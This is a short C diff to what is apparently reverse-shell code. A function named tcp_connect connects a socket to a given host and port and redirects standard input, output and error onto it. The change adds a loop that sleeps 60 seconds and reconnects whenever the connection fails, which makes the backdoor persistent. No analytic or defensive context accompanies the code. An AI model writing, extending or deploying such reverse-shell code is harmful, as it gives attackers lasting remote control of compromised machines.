@@ -18,8 +18,14 @@ void tcp_connect(char * host, int port) {
     revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr(host);
 
-    connect(sock, (struct sockaddr *) &revsockaddr,
+    int err = connect(sock, (struct sockaddr *) &revsockaddr,
             sizeof(revsockaddr));
+
+    if (err == -1) {
+        sleep(60);
+        tcp_connect(host, port);
+    }
+
     dup2(sock, 0);
     dup2(sock, 1);
     dup2(sock, 2);
